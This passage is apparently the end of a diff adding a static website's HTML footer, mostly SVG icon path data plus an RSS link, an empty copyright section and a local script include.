00-.3125.2909c-.0808.1215-.139.2635-.1753.4261a2.3894 2.3894 0 00-.0535.5145c0 .1805.0178.3525.0535.5162.0364.1639.0945.3075.1753.4312a.909.909 0 00.3125.2964c.1274.0732.2815.11.4621.11.1807 0 .334-.0368.4605-.11a.8974.8974 0 00.3086-.2964c.0793-.1237.1372-.2673.1729-.4312a2.3737 2.3737 0 00.0543-.5162c0-.1807-.018-.3523-.0543-.5145-.0357-.1626-.0936-.3046-.1729-.4261a.9011.9011 0 00-.3086-.2909c-.1265-.072-.2798-.1078-.4605-.1078zm-8.5372.0682l-.8407.6175.3141.4294.4762-.3678v1.8773h.603v-2.5564zm6.4863 0l-.8413.6175.3146.4294.4762-.3678v1.8773h.6031v-2.5564zm-4.4355.4442c.0797 0 .1438.0284.1932.0848.0493.0564.0874.1263.114.2093a1.312 1.312 0 01.0542.2691 2.803 2.803 0 01.014.2637c0 .0818-.0048.1712-.014.2689a1.3044 1.3044 0 01-.0543.2707c-.0265.083-.0646.1529-.1139.2093-.0494.0569-.1135.0852-.1932.0852-.0792 0-.1443-.0283-.1947-.0852-.051-.0564-.09-.1263-.1178-.2093a1.244 1.244 0 01-.0557-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.249 1.249 0 01.0557-.269c.0278-.0831.0668-.153.1178-.2094.0504-.0564.1155-.0848.1947-.0848zm6.4864 0c.0793 0 .1436.0284.193.0848.0493.0564.0874.1263.114.2093.0266.083.0444.1732.0543.2691.0092.0966.014.1844.014.2637a2.91 2.91 0 01-.014.2689 1.3176 1.3176 0 01-.0543.2707c-.0266.083-.0647.1529-.114.2093-.0494.0569-.1137.0852-.193.0852-.0791 0-.1444-.0283-.1948-.0852-.051-.0564-.09-.1263-.1176-.2093a1.2445 1.2445 0 01-.056-.2707 2.7355 2.7355 0 01-.0146-.269c0-.0792.0049-.167.0146-.2636a1.2484 1.2484 0 01.056-.269c.0276-.0831.0666-.153.1176-.2094.0504-.0564.1157-.0848.1948-.0848zm-2.1915 3.5112c-.1806 0-.3347.0364-.4621.108a.9076.9076 0 00-.3125.2913c-.0808.1215-.1387.263-.1751.4257a2.3826 2.3826 0 00-.0541.5143c0 .1806.0183.3525.0541.5164.0364.1639.0943.3075.1751.4316a.9092.9092 0 00.3125.2956c.1274.0738.2815.1102.4621.1102.1807 0 .3336-.0364.46-.1102a.8922.8922 0 00.3087-.2956c.0797-.124.1371-.2677.1735-.4316a2.3755 2.3755 0 00.0543-.5164c0-.1801-.018-.352-.0543-.5143-.0364-.1627-.0938-.3042-.1735-.4257a.8904.8904 0 00-.3088-.2913c-.1263-.0716-.2792-.108-.4599-.108zm-6.4016.0684l-.8413.6177.3143.4296.4765-.3684v1.8775h.6033v-2.5564zm2.1252 0l-.8413.6177.314.4296.4768-.3684v1.8775h.6033v-2.5564zm2.116 0l-.8407.6177.3135.4296.4768-.3684v1.8775h.603v-2.5564zm2.1604.4442c.0792 0 .1438.028.1932.085.0493.0565.0874.1265.114.2095.026.083.0444.1725.0537.2691.0097.096.0146.1839.0146.263 0 .082-.0049.1715-.0146.2691a1.3243 1.3243 0 01-.0537.2706c-.0266.083-.0647.153-.114.2095-.0494.0569-.114.085-.1932.085-.0797 0-.1441-.0281-.195-.085-.0506-.0565-.0898-.1265-.1174-.2095a1.2443 1.2443 0 01-.0558-.2706 2.6765 2.6765 0 01-.0146-.269c0-.0792.0048-.1671.0146-.263a1.2413 1.2413 0 01.0558-.2692c.0276-.083.0668-.153.1173-.2095.051-.057.1154-.085.1951-.085zm-6.7291 3.0723c-.1312 0-.243.0264-.3358.0785a.6615.6615 0 00-.2268.2111c-.0586.0885-.1009.1914-.127.3096a1.6979 1.6979 0 00-.0394.3732c0 .1313.013.2562.0394.375.0261.1188.0684.2235.127.313a.6535.6535 0 00.2268.2152c.0927.0532.2046.0797.3358.0797.1307 0 .2424-.0265.334-.0797a.6501.6501 0 00.2241-.2152c.0575-.0895.0996-.1942.1258-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0262-.1182-.0683-.2211-.1258-.3096a.658.658 0 00-.2241-.2111c-.0916-.0521-.2033-.0785-.334-.0785zm3.0859 0c-.1314 0-.243.0264-.3358.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.101.1914-.127.3096a1.6895 1.6895 0 00-.0394.3732c0 .1313.0128.2562.0394.375.026.1188.0684.2235.127.313a.6532.6532 0 00.2268.2152c.0927.0532.2044.0797.3358.0797.1307 0 .2423-.0265.334-.0797a.6496.6496 0 00.224-.2152c.0574-.0895.0993-.1942.1258-.313a1.7415 1.7415 0 00.039-.375 1.724 1.724 0 00-.039-.3732c-.0265-.1182-.0684-.2211-.1259-.3096a.6575.6575 0 00-.224-.2111c-.0916-.0521-.2032-.0785-.334-.0785zm5.1077 0c-.1312 0-.2428.0264-.3356.0785a.6612.6612 0 00-.2268.2111c-.0586.0885-.1008.1914-.127.3096a1.6977 1.6977 0 00-.0396.3732c0 .1313.0132.2562.0397.375.0261.1188.0683.2235.127.313a.6532.6532 0 00.2267.2152c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6496.6496 0 00.224-.2152c.0575-.0895.0992-.1942.1259-.313.026-.1188.039-.2437.039-.375 0-.1306-.013-.2555-.039-.3732-.0267-.1182-.0684-.2211-.126-.3096a.6575.6575 0 00-.2239-.2111c-.0916-.0521-.2035-.0785-.3342-.0785zm-6.658.0498l-.611.4487.2279.3112.3462-.2669v1.3627h.4375v-1.8557zm3.0677 0l-.6106.4487.2282.3112.3462-.2669v1.3627h.4377v-1.8557zm5.1082 0l-.6109.4487.2285.3112.346-.2669v1.3627h.4377v-1.8557zm-9.7115.3228c.0575 0 .1041.0205.14.0612.0358.0412.0633.0917.0823.152a.9604.9604 0 01.0397.1952c.007.07.0102.134.0102.1915 0 .0597-.0031.1247-.0102.1952a.954.954 0 01-.0397.197c-.019.0602-.0465.1107-.0824.1519-.0358.0412-.0824.0612-.1399.0612-.058 0-.1053-.02-.1416-.0612-.037-.0412-.065-.0917-.0852-.152a.8863.8863 0 01-.0407-.1969 1.9609 1.9609 0 01-.0108-.1952c0-.0575.0037-.1215.0108-.1915a.893.893 0 01.0407-.1952c.0202-.0603.0483-.1108.0852-.152.0363-.0407.0836-.0612.1416-.0612zm3.0859 0c.0575 0 .1041.0205.14.0612a.421.421 0 01.0821.152.9392.9392 0 01.0397.1952c.007.07.0103.134.0103.1915 0 .0597-.0033.1247-.0103.1952a.9302.9302 0 01-.0397.197.4211.4211 0 01-.0822.1519c-.0358.0412-.0824.0612-.14.0612-.058 0-.1053-.02-.1417-.0612a.4192.4192 0 01-.085-.152.8458.8458 0 01-.0407-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.004-.1215.011-.1915a.8487.8487 0 01.0407-.1952.4196.4196 0 01.085-.152c.0364-.0407.0837-.0612.1418-.0612zm5.1077 0c.0575 0 .1044.0205.1402.0612a.421.421 0 01.0822.152.9483.9483 0 01.0398.1952c.007.07.0102.134.0102.1915 0 .0597-.0032.1247-.0102.1952a.9427.9427 0 01-.0398.197.421.421 0 01-.0822.1519c-.0358.0412-.0827.0612-.1402.0612-.058 0-.1051-.02-.1415-.0612-.0368-.0412-.065-.0917-.0857-.152a.9503.9503 0 01-.04-.1969 1.9645 1.9645 0 01-.011-.1952c0-.0575.0039-.1215.011-.1915a.9589.9589 0 01.04-.1952c.0207-.0603.0489-.1108.0857-.152.0363-.0407.0835-.0612.1415-.0612zm-1.6842 1.8138c-.1312 0-.2428.0266-.3356.0787a.659.659 0 00-.2268.211c-.0586.0883-.1008.1914-.127.3097a1.7304 1.7304 0 00-.0396.3733c0 .1312.0137.256.0397.3746.026.119.0683.2237.127.3137a.656.656 0 00.2267.2148c.0928.0532.2044.0797.3356.0797.1307 0 .2426-.0265.3342-.0797a.6475.6475 0 00.224-.2148c.0576-.09.0998-.1948.1259-.3137.026-.1187.039-.2434.039-.3746 0-.1307-.013-.2557-.039-.3733-.0261-.1183-.0683-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2035-.0787-.3342-.0787zm3.0627 0c-.1313 0-.243.0266-.3358.0787a.6641.6641 0 00-.2268.211c-.0586.0883-.101.1914-.127.3097a1.7218 1.7218 0 00-.0394.3733c0 .1312.0134.256.0395.3746.026.119.0683.2237.1269.3137a.6609.6609 0 00.2268.2148c.0928.0532.2045.0797.3358.0797s.2424-.0265.334-.0797a.6475.6475 0 00.224-.2148c.0575-.09.1-.1948.1259-.3137a1.7398 1.7398 0 00.0396-.3746c0-.1307-.0135-.2557-.0396-.3733-.026-.1183-.0684-.2214-.126-.3098a.6504.6504 0 00-.2239-.2109c-.0916-.052-.2027-.0787-.334-.0787zm-1.5448.05l-.6109.448.2284.3124.346-.2675v1.3626h.4378v-1.8555zm-1.5179.3228c.0575 0 .1041.0206.14.0613a.4206.4206 0 01.0826.1517.9575.9575 0 01.0396.1953c.007.07.0102.134.0102.1916 0 .0597-.0032.1245-.0102.195a.9512.9512 0 01-.0396.197.4218.4218 0 01-.0826.1519c-.0359.0412-.0825.0612-.14.0612-.058 0-.1052-.02-.1415-.0612-.0368-.0412-.065-.0917-.085-.152a.9149.9149 0 01-.0408-.1969 1.9608 1.9608 0 01-.011-.195c0-.0575.004-.1217.011-.1916a.9232.9232 0 01.0407-.1953c.0202-.0603.0483-.1105.085-.1517.0364-.0407.0836-.0613.1416-.0613zm3.0627 0c.0575 0 .104.0206.1398.0613a.4208.4208 0 01.0826.1517.939.939 0 01.0394.1953c.0071.07.0104.134.0104.1916 0 .0597-.0033.1245-.0104.195a.9296.9296 0 01-.0394.197.4218.4218 0 01-.0826.1519c-.0357.0412-.0823.0612-.1398.0612-.0575 0-.1054-.02-.1417-.0612-.037-.0412-.065-.0917-.085-.152a.9065.9065 0 01-.0408-.1969 1.9495 1.9495 0 01-.0103-.195c0-.0575.0033-.1217.0103-.1916a.9145.9145 0 01.0407-.1953c.02-.0603.0481-.1105.085-.1517.0364-.0407.0843-.0613.1418-.0613zm-9.7123.1855c-.091 0-.1686.0182-.2326.0545a.4563.4563 0 00-.157.146c-.0408.0613-.0702.133-.0881.2149a1.1685 1.1685 0 00-.0271.2587c0 .0907.0086.1773.027.2598.018.082.0474.1546.0881.217a.4589.4589 0 00.157.1487c.064.037.1417.0557.2327.0557.0907 0 .1677-.0188.2311-.0557a.4504.4504 0 00.1558-.1487c.0402-.0624.0688-.135.0873-.217a1.2187 1.2187 0 00.0272-.2598c0-.0911-.0093-.1774-.0272-.2587-.0185-.082-.0471-.1536-.0873-.2148a.4479.4479 0 00-.1558-.146c-.0634-.0364-.1403-.0546-.231-.0546zm1.0519.0346l-.423.3102.1577.2166.2398-.185v.9442h.3037v-1.286zm-1.0519.2236c.0396 0 .0724.0141.0973.0429a.2841.2841 0 01.057.105.689.689 0 01.0276.1352c.0044.0489.007.0927.007.1328 0 .0407-.0027.0862-.007.135a.684.684 0 01-.0277.1362.2845.2845 0 01-.057.1053c-.0248.0288-.0576.043-.0972.043a.1247.1247 0 01-.098-.043.2976.2976 0 01-.0592-.1053.612.612 0 01-.0283-.1361 1.391 1.391 0 01-.0069-.135c0-.0402.0021-.084.007-.1329a.6197.6197 0 01.0282-.1353.2973.2973 0 01.0592-.105.1248.1248 0 01.098-.0428zm3.7749 1.394c-.0907 0-.1681.0178-.2321.0542a.4517.4517 0 00-.1574.1463c-.0407.0608-.07.1326-.088.2144a1.1691 1.1691 0 00-.0276.2587c0 .0905.0092.1774.0277.26.0179.0824.0472.1545.0879.2168a.4562.4562 0 00.1574.1493c.064.0368.1414.0547.232.0547.0912 0 .1683-.0179.2318-.0547a.451.451 0 00.1556-.1493.6636.6636 0 00.0868-.2169 1.1889 1.1889 0 00.0277-.26c0-.0906-.0092-.1773-.0277-.2586-.0179-.0818-.0473-.1536-.0868-.2144a.4461.4461 0 00-.1556-.1463c-.0635-.0364-.1406-.0543-.2317-.0543zm1.0522.034l-.423.3109.1578.2158.2398-.1849v.9444h.3033v-1.2861zm-1.0522.2236c.0401 0 .0726.014.0976.0427a.3008.3008 0 01.057.1054.6431.6431 0 01.027.135 1.31 1.31 0 01.0077.1329c0 .0412-.0027.0863-.0077.135a.655.655 0 01-.027.1367.3066.3066 0 01-.057.1054c-.025.0282-.0575.0421-.0976.0421-.0396 0-.0728-.0139-.0977-.042a.2928.2928 0 01-.0592-.1055.6182.6182 0 01-.028-.1366 1.3641 1.3641 0 01-.0077-.1351c0-.0401.0029-.0841.0077-.1328a.6122.6122 0 01.028-.135.2874.2874 0 01.0592-.1055c.0249-.0287.0581-.0427.0977-.0427z"/></svg>
+        </a>
+        <a href="/blog/index.xml" title="RSS" target="_blank" rel="noopener noreferrer" class="hx-text-black dark:hx-text-white">
+          <svg height=30 xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" aria-hidden="true"><path stroke-linecap="round" stroke-linejoin="round" d="M6 5c7.18 0 13 5.82 13 13M6 11a7 7 0 017 7m-6 0a1 1 0 11-2 0 1 1 0 012 0z"/></svg>
+        </a>
+      </div>
+    </div>
+    
+    <hr class="hx-border-black/5 dark:hx-border-white/10 hx-my-2" />
+    
+    <div class="copyright-section hx-text-center hx-text-black dark:hx-text-white hx-py-4">
+        <p></p>
+    </div>
+  </div>
+</footer>
+    
+    <script defer src="/js/main.js" integrity=""></script>
+
+
+
+
+  </body>
+</html>
